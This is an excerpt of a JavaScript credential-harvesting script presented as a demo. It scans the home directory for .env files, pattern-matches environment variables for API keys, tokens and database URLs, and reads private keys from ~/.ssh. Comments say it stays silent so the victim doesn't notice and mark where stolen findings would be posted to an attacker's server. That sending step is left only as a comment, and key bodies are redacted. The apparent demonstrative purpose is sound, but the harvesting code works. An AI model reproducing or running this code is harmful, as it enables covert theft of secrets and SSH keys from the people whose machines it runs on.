...
// Env var names that are obviously not secrets, even if they substring-match
const BENIGN_NAMES = new Set([
  'PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'PWD', 'LANG', 'LANGUAGE',
  'SHLVL', 'OLDPWD', 'LOGNAME', 'DISPLAY', 'COLORTERM', 'LS_COLORS',
  'LESSOPEN', 'LESSCLOSE', 'PAGER', 'EDITOR', 'VISUAL', 'MANPATH',
...
// Names that strongly suggest a secret is stored
const SENSITIVE_NAME_RE = /secret|password|passwd|api[_-]?key|private[_-]?key|access[_-]?key|access[_-]?secret|auth[_-]?token|credential|db[_-]pass|db[_-]url|database[_-]url|dsn|stripe|twilio|sendgrid|aws[_-]|gcp[_-]|azure[_-]|github[_-]token|slack[_-]token|webhook[_-]secret/i;
...
function isSensitiveValue(value) {
  ...
  // Skip paths, URLs, and space-separated sentences
  if (value.includes('/') || value.includes(':') || value.includes(' ')) return false;
  // Must look like a random token/key — dense alphanumeric with optional - or _
  return /^[A-Za-z0-9_-]{20,}$/.test(value) || /^[A-Za-z0-9+/]{20,}={0,2}$/.test(value);
}
...
function parseEnvFile(filePath) {
  ...
  for (const rawLine of content.split('\n')) {
    // Strip export keyword (used in .envrc)
...
const ENV_FILE_NAMES = new Set([
  '.env', '.envrc', '.env.local', '.env.development', '.env.development.local',
  '.env.production', '.env.production.local', '.env.staging', '.env.test',
  '.env.test.local',
]);
...
function walkForEnvFiles(dir, depth = 0, maxDepth = 4) {
  ...
  for (const entry of entries) {
    if (['.git', 'node_modules', '.svn', '.hg'].includes(entry.name)) continue;

    const full = path.join(dir, entry.name);

    if (entry.isDirectory()) {
      walkForEnvFiles(full, depth + 1, maxDepth);
    } else if (ENV_FILE_NAMES.has(entry.name) || /^\.env(\..+)?$/.test(entry.name)) {
      parseEnvFile(full);
    }
  }
}
...
const PRIVATE_KEY_HEADER_RE = /-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----/;
const SSH_NON_KEY_FILES = new Set([
  'known_hosts', 'authorized_keys', 'config', 'environment',
]);

function scanSSHDir() {
  const sshDir = path.join(os.homedir(), '.ssh');
  let entries;
  try { entries = fs.readdirSync(sshDir, { withFileTypes: true }); } catch { return; }
  ...
  for (const entry of entries) {
    ...
    if (PRIVATE_KEY_HEADER_RE.test(content)) {
      ...
      report('SSH private key', entry.name, header + ' [key body redacted in demo]', full);
    }
  }
}
...
walkForEnvFiles(os.homedir(), 1, 1); // shallow scan of ~ for .env files at root only
scanProcessEnv();
scanSSHDir();
...
if (unique.length === 0) {
  // Stay silent when nothing is found so the victim doesn't notice
  process.exitCode = 0;
} else {
  ...
  // In a real attack this is where you'd POST the findings to an attacker-controlled server:
  //
  ...
  //   req.end();
  //
  // (kept as a comment so this file stays safe for the demo)
}
